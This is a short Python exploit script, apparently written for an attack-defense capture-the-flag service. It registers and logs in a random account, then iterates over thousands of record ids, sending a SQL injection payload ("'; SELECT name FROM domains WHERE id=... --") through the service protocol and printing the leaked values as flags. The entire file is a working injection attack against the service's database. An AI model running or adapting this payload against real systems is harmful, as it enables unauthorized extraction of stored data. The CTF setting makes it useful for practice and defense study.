#!../venv/bin/python
import sys
sys.path.insert(1, "../")

from checker import PORT
from service_api import *

with remote(sys.argv[1], PORT) as io:
    username = generate_str(7, 30)
    password = generate_str(25, 30)
    register(io, username, password)
    login(io, username, password)
    for i in range(1, 0x4000):
        io.sendline(f"2|2|1 '; SELECT name FROM domains WHERE id={i} --".encode())
        flag = io.recv(timeout=5)
        offset = len("Addr is taken by id: ")
        print(flag[offset:])
    exit_(io)
